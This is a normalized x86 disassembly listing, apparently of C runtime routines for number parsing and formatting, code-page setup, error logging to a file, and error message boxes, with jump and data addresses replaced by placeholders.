mov ebx eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0xc ] 0x0
je r-xdata
inc [ ebp - 0x14 ]
mov eax [ ebp + 0x14 ]
push eax
call [ ebp + 0xc ]
pop ecx
mov ebx eax
cmp [ ebp - 0x44 ] 0x0
je r-xdata
mov eax [ ebp + 0x14 ]
push eax
push ebx
call [ ebp + 0x10 ]
add esp 0x8
dec [ ebp - 0x14 ]
cmp ebx 0x30
jl r-xdata
cmp [ ebp - 0x4 ] 0x8000
jne r-xdata
cmp ebx 0x49
je r-xdata
test esi esi
jge r-xdata
neg edi
neg [ ebp - 0xd ]
cmp ebx 0x30
jl r-xdata
xor eax eax
cmp ebx 0x2d
mov [ ebp - 0x44 ] eax
jne r-xdata
cmp esi 0xfffffffe
je r-xdata
cmp ebx 0x39
jg r-xdata
test esi esi
jle r-xdata
inc [ ebp - 0x14 ]
mov edx [ ebp + 0x14 ]
push edx
call [ ebp + 0xc ]
pop ecx
mov ebx eax
dec [ ebp + 0x18 ]
js r-xdata
cmp ebx 0x4e
je r-xdata
cmp [ ebp - 0xd ] 0x0
je r-xdata
xor edx edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x1c ] dx
jmp r-xdata
cmp ebx 0x39
jg r-xdata
cmp ebx 0x2b
je r-xdata
mov [ ebp - 0xc ] 0x1
jmp r-xdata
sub ebx 0x30
inc esi
test esi esi
jg r-xdata
xor edx edx
mov edx esi
jmp r-xdata
cmp ebx 0x4e
jne r-xdata
inc [ ebp - 0x14 ]
mov ecx [ ebp + 0x14 ]
push ecx
call [ ebp + 0xc ]
pop ecx
mov ebx eax
dec [ ebp + 0x18 ]
js r-xdata
cmp esi [ ebp - 0x8 ]
jle r-xdata
cmp [ ebp - 0xd ] 0x1
jne r-xdata
mov edx edi
add edx edx
lea edx [ edx + edx * 4 ]
add ebx edx
add ebx 0xffffffd0
mov edi ebx
cmp ebx 0x1344
jle r-xdata
dec [ ebp + 0x18 ]
js r-xdata
cmp esi 0x9
jg r-xdata
mov eax [ ebp - 0x34 ]
test ebx ebx
mov [ eax ] bx
je r-xdata
mov [ ebp - 0x4 ] edx
jmp r-xdata
inc [ ebp - 0x14 ]
mov eax [ ebp + 0x14 ]
push eax
call [ ebp + 0xc ]
pop ecx
mov ebx eax
dec [ ebp + 0x18 ]
js r-xdata
cmp ebx 0x41
jne r-xdata
mov edx esi
mov edx [ ebp - 0x8 ]
jmp r-xdata
xor eax eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] ax
mov ecx [ ebp - 0x34 ]
mov ax 0xffff
mov [ ecx + 0x6 ] ax
mov edx [ ebp - 0x34 ]
mov [ edx + 0x4 ] ax
mov edx [ ebp - 0x34 ]
mov [ edx + 0x2 ] ax
mov edx [ ebp - 0x34 ]
mov [ edx ] ax
mov ecx [ ebp - 0x34 ]
mov [ ecx + 0x8 ] 0x7ffe
jmp r-xdata
mov [ ebp - 0xd ] 0x1
jmp r-xdata
cmp esi [ ebp - 0x8 ]
jg r-xdata
mov eax [ edi ]
add eax eax
lea eax [ eax + eax * 4 ]
add eax ebx
mov [ edi ] eax
jmp r-xdata
or esi 0xffffffff
cmp [ ebp - 0x4 ] 0x8000
je r-xdata
mov esi 0x1
jmp r-xdata
cmp ebx 0x46
jne r-xdata
inc [ ebp - 0x14 ]
mov eax [ ebp + 0x14 ]
push eax
call [ ebp + 0xc ]
pop ecx
mov ebx eax
dec [ ebp + 0x18 ]
js r-xdata
test edi edi
jle r-xdata
mov eax [ ebp - 0x4 ]
lea ecx [ ebp - 0x24 ]
sub eax edx
push ecx
add edi eax
call sub_452718
pop ecx
fstp [ ebp - 0x24 ]
fwait
test edi edi
je r-xdata
mov [ ebp - 0x18 ] 0x2
jmp r-xdata
mov edx [ edi ]
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x3c ] edx
mov ecx [ edi + 0x4 ]
mov [ ebp - 0x38 ] ecx
push ebx
push eax
call sub_452a78
add esp 0x8
test eax eax
je r-xdata
dec [ ebp - 0x4 ]
jmp r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
cmp ebx 0x4e
jne r-xdata
mov eax edi
neg eax
mov eax edi
jmp r-xdata
mov ecx [ ebp - 0x3c ]
mov [ edi ] ecx
mov eax [ ebp - 0x38 ]
mov [ edi + 0x4 ] eax
jmp r-xdata
lea edx [ esi - 0x1 ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
mov edx [ rw-data ]
mov [ ebp - 0x24 ] edx
mov edx [ rw-data ]
mov [ ebp - 0x20 ] edx
mov dx [ rw-data ]
mov [ ebp - 0x1c ] dx
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x24 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x20 ] eax
mov ax [ rw-data ]
mov [ ebp - 0x1c ] ax
jmp r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
fld [ ebp - 0x24 ]
fld [ ebp - 0x30 ]
fmulp st1
fstp [ ebp - 0x24 ]
fwait
fld [ ebp - 0x24 ]
fld [ ebp - 0x30 ]
fdivp st1
fstp [ ebp - 0x24 ]
fwait
jmp r-xdata
push eax
call sub_4524f4
pop ecx
fstp [ ebp - 0x30 ]
fwait
test edi edi
jge r-xdata
mov edx [ rw-data ]
mov [ ebp - 0x24 ] edx
mov edx [ rw-data ]
mov [ ebp - 0x20 ] edx
mov dx [ rw-data ]
mov [ ebp - 0x1c ] dx
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x24 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x20 ] eax
mov ax [ rw-data ]
mov [ ebp - 0x1c ] ax
jmp r-xdata
sub_453a2c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
test al 0x4
je r-xdata
test al 0x8
je r-xdata
push [ rw-data ]
push [ rw-data ]
mov dx [ ebx + 0x8 ]
push edx
push [ ebx + 0x4 ]
push [ ebx ]
push 0x1
call sub_452834
add esp 0x18
fstp [ esi ]
fwait
jmp r-xdata
fld [ rw-data ]
fstp [ ebp - 0x8 ]
fwait
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
mov dx [ ebx + 0x8 ]
push edx
push [ ebx + 0x4 ]
push [ ebx ]
push 0x0
call sub_452834
add esp 0x18
fstp [ esi ]
fwait
mov ecx [ ebx ]
mov [ esi ] ecx
mov ecx [ ebx + 0x4 ]
mov [ esi + 0x4 ] ecx
mov cx [ ebx + 0x8 ]
mov [ esi + 0x8 ] cx
jmp r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_453ac4
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov [ ebp - 0x2 ] 0xa
mov eax [ ebp + 0x18 ]
sub eax 0x2
je r-xdata
mov edx [ ebp + 0x8 ]
fld [ edx ]
fstp [ ebp - 0xc ]
fwait
jmp r-xdata
sub eax 0x4
je r-xdata
lea eax [ ebp - 0xc ]
lea edx [ ebp - 0xc ]
mov [ ebp - 0x10 ] edx
mov bx [ eax + 0x8 ]
mov edx ebx
and dx 0x7fff
mov [ eax + 0x8 ] dx
test bh 0x80
setne al
and eax 0x1
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
lea eax [ ebp - 0xc ]
push eax
call sub_45276c
and ax 0x4700
pop ecx
cmp ax 0x4000
jne r-xdata
mov ecx [ ebp + 0x8 ]
fld [ ecx ]
fstp [ ebp - 0xc ]
fwait
jmp r-xdata
sub eax 0x2
je r-xdata
cmp ax 0x500
jne r-xdata
mov ebx [ ebp + 0xc ]
test ebx ebx
jg r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
mov [ ebp - 0xc ] edx
mov edx [ eax + 0x4 ]
mov [ ebp - 0x8 ] edx
mov dx [ eax + 0x8 ]
mov [ ebp - 0x4 ] dx
jmp r-xdata
cmp ax 0x100
jne r-xdata
mov eax 0x7fff
jmp r-xdata
cmp ebx 0x28
jle r-xdata
neg ebx
inc ebx
movzx eax bx
and eax 0x7fff
mov ecx [ ebp - 0x10 ]
add eax 0xffffc001
imul edx eax 0x4d10
mov eax edx
xor edx edx
mov dl [ ecx + 0x7 ]
add edx edx
and edx 0xff
mov ecx edx
lea edx [ ecx + edx * 8 ]
lea edx [ ecx + edx * 2 ]
lea edx [ ecx + edx * 4 ]
movsx edx dx
and edx 0xffff
add eax edx
mov ecx eax
sar ecx 0x10
test eax 0xffff
mov [ ebp - 0x14 ] ecx
je r-xdata
mov eax 0x7ffe
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebx
push 0x30
mov eax [ ebp + 0x14 ]
push eax
call sub_44f094
add esp 0xc
mov edx [ ebp + 0x14 ]
mov [ edx + ebx ] 0x0
mov eax 0x1
jmp r-xdata
mov ebx 0x28
mov edi [ ebp + 0xc ]
test edi edi
jg r-xdata
inc [ ebp - 0x14 ]
cmp edi 0x13
jle r-xdata
mov edi [ ebp - 0x14 ]
sub edi [ ebp + 0xc ]
test edi edi
jl r-xdata
mov esi edi
sub esi [ ebp - 0x14 ]
test esi esi
je r-xdata
mov edi 0x13
push edi
call sub_4524f4
pop ecx
fstp [ ebp - 0x20 ]
fwait
fld [ ebp - 0xc ]
fld [ ebp - 0x20 ]
fcompp
fnstsw ax
sahf
jae r-xdata
mov ebx esi
test esi esi
jge r-xdata
lea ecx [ edi - 0x1 ]
push ecx
call sub_4524f4
pop ecx
fstp [ ebp - 0x20 ]
fwait
fld [ ebp - 0xc ]
fld [ ebp - 0x20 ]
fcompp
fnstsw ax
sahf
jbe r-xdata
inc [ ebp - 0x14 ]
inc edi
cmp edi 0x13
jg r-xdata
cmp ebx 0x1344
jle r-xdata
mov ebx esi
neg ebx
test edi edi
jl r-xdata
dec [ ebp - 0x14 ]
dec edi
cmp [ ebp + 0xc ] 0x0
jle r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
push ebx
call sub_4524f4
pop ecx
fstp [ ebp - 0x20 ]
fwait
test esi esi
jge r-xdata
mov ebx 0x1344
lea ecx [ ebp - 0xc ]
push ecx
lea eax [ ebp - 0xc ]
push eax
call sub_452748
mov edx [ ebp + 0x14 ]
add esp 0x8
add edx edi
xor esi esi
mov ebx edx
mov [ ebp - 0x24 ] edx
mov [ ebx ] 0x0
dec ebx
test edi edi
jne r-xdata
movsx edx [ ebp - 0x2 ]
mov [ ebp - 0x28 ] edx
fild [ ebp - 0x28 ]
fld [ ebp - 0xc ]
fmulp st1
fstp [ ebp - 0xc ]
fwait
inc edi
movsx edx [ ebp - 0x2 ]
mov [ ebp - 0x28 ] edx
fild [ ebp - 0x28 ]
fld [ ebp - 0xc ]
fdivrp st1
fstp [ ebp - 0xc ]
fwait
dec edi
jmp r-xdata
fld [ ebp - 0x20 ]
fld [ ebp - 0xc ]
fmulp st1
fstp [ ebp - 0xc ]
fwait
sub esi ebx
fld [ ebp - 0x20 ]
fld [ ebp - 0xc ]
fdivrp st1
fstp [ ebp - 0xc ]
fwait
add esi ebx
jmp r-xdata
lea eax [ ebp - 0xc ]
push eax
call sub_452a50
pop ecx
movsx edx al
or esi edx
add eax 0x30
mov [ ebx ] al
dec ebx
dec edi
je r-xdata
mov eax [ ebp - 0x10 ]
movzx esi [ eax ]
and esi 0xff
xor esi 0x1
test esi esi
jne r-xdata
test esi esi
jne r-xdata
test esi esi
jne r-xdata
jmp r-xdata
jmp r-xdata
mov ebx [ ebp + 0xc ]
test ebx ebx
jg r-xdata
inc [ ebp - 0x14 ]
cmp [ ebp + 0xc ] 0x0
jg r-xdata
cmp ebx 0x28
jle r-xdata
mov ebx [ ebp - 0x14 ]
sub ebx [ ebp + 0xc ]
inc [ ebp - 0x24 ]
mov [ ebx + 0x1 ] 0x31
mov edx [ ebp - 0x24 ]
mov [ edx ] 0x30
mov eax [ ebp - 0x24 ]
mov [ eax ] 0x0
mov edx [ ebp - 0x24 ]
sub edx [ ebp + 0x14 ]
sub ebx edx
test ebx ebx
jle r-xdata
mov ebx 0x28
mov eax [ ebp - 0x14 ]
push ebx
push 0x30
mov ecx [ ebp - 0x24 ]
push ecx
call sub_44f094
add esp 0xc
mov eax [ ebp - 0x24 ]
mov [ eax + ebx ] 0x0
sub_453d98
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov [ ebp - 0x2 ] 0xa
mov eax [ ebp + 0x18 ]
sub eax 0x2
je r-xdata
mov edx [ ebp + 0x8 ]
fld [ edx ]
fstp [ ebp - 0xc ]
fwait
jmp r-xdata
sub eax 0x4
je r-xdata
lea eax [ ebp - 0xc ]
lea edx [ ebp - 0xc ]
mov [ ebp - 0x10 ] edx
mov bx [ eax + 0x8 ]
mov edx ebx
and dx 0x7fff
mov [ eax + 0x8 ] dx
test bh 0x80
setne al
and eax 0x1
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
lea eax [ ebp - 0xc ]
push eax
call sub_45276c
and ax 0x4700
pop ecx
cmp ax 0x4000
jne r-xdata
mov ecx [ ebp + 0x8 ]
fld [ ecx ]
fstp [ ebp - 0xc ]
fwait
jmp r-xdata
sub eax 0x2
je r-xdata
cmp ax 0x500
jne r-xdata
mov ebx [ ebp + 0xc ]
test ebx ebx
jg r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
mov [ ebp - 0xc ] edx
mov edx [ eax + 0x4 ]
mov [ ebp - 0x8 ] edx
mov dx [ eax + 0x8 ]
mov [ ebp - 0x4 ] dx
jmp r-xdata
cmp ax 0x100
jne r-xdata
mov eax 0x7fff
jmp r-xdata
cmp ebx 0x28
jle r-xdata
neg ebx
inc ebx
movzx eax bx
and eax 0x7fff
mov ecx [ ebp - 0x10 ]
add eax 0xffffc001
imul edx eax 0x4d10
mov eax edx
xor edx edx
mov dl [ ecx + 0x7 ]
add edx edx
and edx 0xff
mov ecx edx
lea edx [ ecx + edx * 8 ]
lea edx [ ecx + edx * 2 ]
lea edx [ ecx + edx * 4 ]
movsx edx dx
and edx 0xffff
add eax edx
mov ecx eax
sar ecx 0x10
test eax 0xffff
mov [ ebp - 0x14 ] ecx
je r-xdata
mov eax 0x7ffe
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebx
push 0x30
mov eax [ ebp + 0x14 ]
push eax
call sub_44f120
mov edx [ ebp + 0x14 ]
add esp 0xc
mov eax 0x1
mov [ edx + ebx * 2 ] 0x0
jmp r-xdata
mov ebx 0x28
mov edi [ ebp + 0xc ]
test edi edi
jg r-xdata
inc [ ebp - 0x14 ]
cmp edi 0x13
jle r-xdata
mov edi [ ebp - 0x14 ]
sub edi [ ebp + 0xc ]
test edi edi
jl r-xdata
mov esi edi
sub esi [ ebp - 0x14 ]
test esi esi
je r-xdata
mov edi 0x13
push edi
call sub_4524f4
pop ecx
fstp [ ebp - 0x20 ]
fwait
fld [ ebp - 0xc ]
fld [ ebp - 0x20 ]
fcompp
fnstsw ax
sahf
jae r-xdata
mov ebx esi
test esi esi
jge r-xdata
lea ecx [ edi - 0x1 ]
push ecx
call sub_4524f4
pop ecx
fstp [ ebp - 0x20 ]
fwait
fld [ ebp - 0xc ]
fld [ ebp - 0x20 ]
fcompp
fnstsw ax
sahf
jbe r-xdata
inc [ ebp - 0x14 ]
inc edi
cmp edi 0x13
jg r-xdata
cmp ebx 0x1344
jle r-xdata
mov ebx esi
neg ebx
test edi edi
jl r-xdata
dec [ ebp - 0x14 ]
dec edi
cmp [ ebp + 0xc ] 0x0
jle r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
push ebx
call sub_4524f4
pop ecx
fstp [ ebp - 0x20 ]
fwait
test esi esi
jge r-xdata
mov ebx 0x1344
lea ecx [ ebp - 0xc ]
push ecx
lea eax [ ebp - 0xc ]
push eax
call sub_452748
mov edx edi
add esp 0x8
add edx edx
xor esi esi
add edx [ ebp + 0x14 ]
mov ebx edx
mov [ ebp - 0x24 ] edx
mov [ ebx ] 0x0
sub ebx 0x2
test edi edi
jne r-xdata
movsx edx [ ebp - 0x2 ]
mov [ ebp - 0x28 ] edx
fild [ ebp - 0x28 ]
fld [ ebp - 0xc ]
fmulp st1
fstp [ ebp - 0xc ]
fwait
inc edi
movsx edx [ ebp - 0x2 ]
mov [ ebp - 0x28 ] edx
fild [ ebp - 0x28 ]
fld [ ebp - 0xc ]
fdivrp st1
fstp [ ebp - 0xc ]
fwait
dec edi
jmp r-xdata
fld [ ebp - 0x20 ]
fld [ ebp - 0xc ]
fmulp st1
fstp [ ebp - 0xc ]
fwait
sub esi ebx
fld [ ebp - 0x20 ]
fld [ ebp - 0xc ]
fdivrp st1
fstp [ ebp - 0xc ]
fwait
add esi ebx
jmp r-xdata
lea eax [ ebp - 0xc ]
push eax
call sub_452a50
pop ecx
movsx edx al
or esi edx
movsx ecx al
add cx 0x30
mov [ ebx ] cx
sub ebx 0x2
dec edi
je r-xdata
mov eax [ ebp - 0x10 ]
movzx esi [ eax ]
and esi 0xff
xor esi 0x1
test esi esi
jne r-xdata
test esi esi
jne r-xdata
test esi esi
jne r-xdata
jmp r-xdata
jmp r-xdata
mov ebx [ ebp + 0xc ]
test ebx ebx
jg r-xdata
inc [ ebp - 0x14 ]
cmp [ ebp + 0xc ] 0x0
jg r-xdata
cmp ebx 0x28
jle r-xdata
mov ebx [ ebp - 0x14 ]
sub ebx [ ebp + 0xc ]
add [ ebp - 0x24 ] 0x2
mov [ ebx + 0x2 ] 0x31
mov eax [ ebp - 0x24 ]
mov [ eax ] 0x30
mov eax [ ebp - 0x24 ]
mov [ eax ] 0x0
mov edx [ ebp - 0x24 ]
sub edx [ ebp + 0x14 ]
sar edx 0x1
jns r-xdata
mov ebx 0x28
sub ebx edx
test ebx ebx
jle r-xdata
adc edx 0x0
mov eax [ ebp - 0x14 ]
push ebx
push 0x30
mov ecx [ ebp - 0x24 ]
push ecx
call sub_44f120
add esp 0xc
mov eax [ ebp - 0x24 ]
mov [ eax + ebx * 2 ] 0x0
sub_45408c
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp eax 0x1
jne r-xdata
test eax eax
je r-xdata
xor eax eax
mov al bl
test [ eax + rw-data ] 0x8
je r-xdata
xor edx edx
mov dl bl
test [ edx + rw-data ] 0x4
je r-xdata
cmp eax 0x2
je r-xdata
or eax 0xffffffff
mov eax 0x2
jmp r-xdata
mov esi ebx
and esi 0xff
push esi
call sub_451c20
pop ecx
test eax eax
jne r-xdata
mov eax 0x1
jmp r-xdata
inc eax
jne r-xdata
pop esi
pop ebx
pop ebp
retn
xor eax eax
jmp r-xdata
test [ esi + rw-data ] 0x3
je r-xdata
sub_4540f8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov esi [ ebp + 0x8 ]
cmp esi 0xfffffffe
jne r-xdata
cmp esi 0xfffffffd
jne r-xdata
call GetOEMCP
mov esi eax
jmp r-xdata
cmp esi 0xfffffffc
jne r-xdata
call GetACP
mov esi eax
jmp r-xdata
test esi esi
je r-xdata
mov eax [ rw-data ]
mov esi [ eax ]
xor eax eax
mov edx rw-data
lea eax [ ebp - 0x14 ]
push eax
push esi
call GetCPInfo
test eax eax
jne r-xdata
mov [ edx ] 0x0
inc eax
inc edx
cmp eax 0x101
jl r-xdata
test esi esi
je r-xdata
push rw-data
call sub_454504
pop ecx
or eax 0xffffffff
jmp r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ ebp - 0x14 ] 0x1
jbe r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0xe ]
jmp r-xdata
mov al [ ecx ]
test al al
je r-xdata
mov eax 0x1
mov edx rw-data
cmp [ ecx + 0x1 ] 0x0
jne r-xdata
or [ edx ] 0x8
inc eax
inc edx
cmp eax 0xff
jl r-xdata
cmp esi 0x3a4
jne r-xdata
and eax 0xff
lea edx [ eax + rw-data ]
jmp r-xdata
mov [ rw-data ] esi
jmp r-xdata
xor eax eax
mov al [ rw-data ]
lea edx [ eax + rw-data ]
jmp r-xdata
xor ebx ebx
mov bl [ ecx + 0x1 ]
cmp eax ebx
jle r-xdata
xor eax eax
xor ecx ecx
mov cl [ rw-data ]
cmp eax ecx
jle r-xdata
mov [ edx ] 0x4
inc eax
inc edx
add ecx 0x2
or [ edx ] 0x1
inc eax
inc edx
xor eax eax
mov al [ rw-data ]
lea edx [ eax + rw-data ]
jmp r-xdata
xor ecx ecx
mov cl [ rw-data ]
cmp eax ecx
jle r-xdata
or [ edx ] 0x2
inc eax
inc edx
sub_454234
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xff
jbe r-xdata
push eax
call sub_451c4c
pop ecx
pop ebp
retn
xor eax eax
pop ebp
retn
sub_454250
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
or eax 0xffffffff
push eax
push edx
call sub_45408c
add esp 0x8
test esi esi
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebx
pop ebp
retn
inc ebx
dec esi
jmp r-xdata
mov dl [ ebx ]
test dl dl
jne r-xdata
sub_454280
push ebp
mov ebp esp
push ebx
push esi
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov edx esi
jmp r-xdata
test ecx ecx
jbe r-xdata
test ecx ecx
jbe r-xdata
cmp [ eax ] 0x0
jne r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn
mov [ edx ] 0x0
inc edx
dec ecx
test ecx ecx
ja r-xdata
xor ebx ebx
mov bl [ eax ]
test [ ebx + rw-data ] 0x4
je r-xdata
mov bl [ eax ]
inc eax
mov [ edx ] bl
inc edx
dec ecx
cmp ecx 0x2
jb r-xdata
cmp [ eax + 0x1 ] 0x0
je r-xdata
mov bl [ eax ]
inc eax
mov [ edx ] bl
inc edx
dec ecx
sub_4542d4
push ebp
mov ebp esp
push ebx
push esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor edx edx
xor ebx ebx
mov bl [ eax ]
cmp ecx ebx
jne r-xdata
cmp [ eax + 0x1 ] 0x0
jne r-xdata
mov bl [ eax ]
inc eax
test bl bl
jne r-xdata
mov edx eax
xor ebx ebx
mov bl [ eax ]
shl ebx 0x8
movzx esi [ eax + 0x1 ]
or ebx esi
cmp ecx ebx
jne r-xdata
inc eax
test ecx ecx
jne r-xdata
xor ebx ebx
mov bl [ eax ]
test [ ebx + rw-data ] 0x4
je r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
inc eax
jmp r-xdata
mov edx eax
mov edx eax
jmp r-xdata
sub_45432c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
mov [ ebx ] 0x0
lea eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
add [ ebp - 0x4 ] 0x4
mov eax [ ebp - 0x4 ]
mov esi [ eax - 0x4 ]
test esi esi
jne r-xdata
push ebx
call sub_44f174
pop ecx
mov edi [ ebp + 0xc ]
sub edi eax
dec edi
test edi edi
jle r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push edi
push esi
push ebx
call sub_44f1d0
add esp 0xc
sub_454374
push ebp
mov ebp esp
push 0x0
push rw-data
mov eax [ ebp + 0xc ]
push eax
push rw-data
mov edx [ ebp + 0x8 ]
push edx
push rw-data
push 0xf6
push rw-data
call sub_45432c
add esp 0x20
push rw-data
call sub_44f174
pop ecx
add eax rw-data
push eax
mov ecx [ ebp + 0x10 ]
push ecx
call sub_4529c0
add esp 0x8
push rw-data
call sub_454504
pop ecx
call sub_45465c
pop ebp
retn
sub_4543d4
add esp 0xfffffff0
push esp
call GetLocalTime
movzx eax [ esp + 0xe ]
push eax
movzx edx [ esp + 0x10 ]
push edx
movzx ecx [ esp + 0x12 ]
push ecx
movzx eax [ esp + 0x14 ]
push eax
movzx edx [ esp + 0x10 ]
push edx
movzx ecx [ esp + 0x1a ]
push ecx
movzx eax [ esp + 0x1a ]
push eax
push rw-data
push rw-data
call wsprintfA
add esp 0x24
mov eax rw-data
add esp 0x10
retn
sub_454424
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
push 0xc0000000
mov eax [ ebp + 0x8 ]
push eax
call CreateFileA
mov ebx eax
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4543d4
mov esi eax
lea eax [ ebp - 0x4 ]
push 0x0
push eax
push esi
call sub_44f174
pop ecx
push eax
push esi
push ebx
call WriteFile
push 0x0
lea edx [ ebp - 0x4 ]
push edx
push edi
call sub_44f174
pop ecx
push eax
push edi
push ebx
call WriteFile
push ebx
call CloseHandle
sub_45448c
push ebx
push esi
call GetLastError
mov esi eax
call sub_45569c
mov ebx eax
push esi
add ebx 0xc
call SetLastError
mov eax ebx
pop esi
pop ebx
retn
sub_4544c0
push ecx
xor eax eax
mov [ esp ] eax
call GetVersion
shr eax 0x10
movzx edx ax
test dh 0x80
jne r-xdata
mov edx esp
push edx
push sub_4544ac
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax 0x2000
cmp [ esp ] 0x0
jne r-xdata
mov eax 0x2000
pop edx
retn
pop edx
retn
add eax 0xfffff000
sub_454504
push ebp
mov ebp esp
add esp 0xffffff7c
cmp [ rw-data ] 0x0
push ebx
push esi
mov esi [ ebp + 0x8 ]
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ rw-data ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ rw-data ] 0xffffffff
je r-xdata
push esi
call [ rw-data ]
pop ecx
push 0xfffffff4
call GetStdHandle
mov ebx eax
lea eax [ ebp - 0x4 ]
push 0x0
push eax
push 0x2
push rw-data
push ebx
call WriteFile
push 0x0
lea edx [ ebp - 0x4 ]
push edx
push esi
call sub_44f174
pop ecx
push eax
push esi
push ebx
call WriteFile
push 0x0
lea ecx [ ebp - 0x4 ]
push ecx
push 0x2
push rw-data
push ebx
call WriteFile
jmp r-xdata
push 0x80
lea eax [ ebp - 0x84 ]
push eax
push 0x0
call GetModuleFileNameA
push 0x5c
lea edx [ ebp - 0x84 ]
push edx
call sub_4542d4
add esp 0x8
mov ebx eax
test eax eax
jne r-xdata
cmp [ eax ] 0x0
je r-xdata
inc ebx
push 0x3a
lea edx [ ebp - 0x84 ]
push edx
call sub_4542d4
add esp 0x8
mov ebx eax
test eax eax
jne r-xdata
push esi
push eax
call sub_454424
add esp 0x8
lea ebx [ ebp - 0x84 ]
jmp r-xdata
call sub_4544c0
or eax 0x10010
push eax
push ebx
push esi
push 0x0
call MessageBoxA
jmp r-xdata
sub_454670
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
call sub_45540c
test ebx ebx
jne r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
call sub_45541c
pop ebx
pop ebp
retn
test ebx ebx
jne r-xdata
call sub_4553a0
call [ rw-data ]
jmp r-xdata
call [ rw-data ]
call sub_45541c
call sub_450690
call sub_4510a0
mov edx [ ebp + 0x10 ]
push edx
call sub_4552b4
call [ rw-data ]
call [ rw-data ]
cmp [ ebp + 0xc ] 0x0
jne r-xdata
sub_454798
push ebx
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
retn
xor eax eax
xor edx edx
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] edx
mov ecx [ rw-data ]
push ecx
call sub_44f2d4
pop ecx
mov ebx eax
mov [ rw-data ] ebx
push sub_454854
mov eax [ rw-data ]
push eax
push ebx
call [ rw-data ]
add esp 0xc
test eax eax
je r-xdata
xor edx edx
xor ecx ecx
mov [ rw-data ] edx
mov [ rw-data ] ecx
push 0x0
push 0x0
call sub_454854
add esp 0x8
dec [ rw-data ]
jmp r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
mov edx [ rw-data ]
mov [ rw-data ] edx
sub_454820
call [ rw-data ]
cmp [ rw-data ] 0x0
je r-xdata
retn
mov eax [ rw-data ]
push eax
call sub_44ebe4
pop ecx
mov edx [ rw-data ]
push edx
call sub_44ebe4
pop ecx
xor ecx ecx
mov [ rw-data ] ecx
sub_454854
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
mov eax [ rw-data ]
cmp eax [ rw-data ]
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
add [ rw-data ] 0x10
mov edx [ rw-data ]
shl edx 0x2
push edx
mov ecx [ rw-data ]
push ecx
call sub_44ebf4
add esp 0x8
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov ebx esi
push esi
call sub_44f174
pop ecx
inc eax
push eax
call sub_44ebd4
pop ecx
mov ebx eax
test eax eax
jne r-xdata
push rw-data
call sub_454630
pop ecx
xor eax eax
push esi
mov edi esi
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi ebx
xchg edi esi
mov edx ecx
mov eax edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
jmp r-xdata
push rw-data
call sub_454630
pop ecx
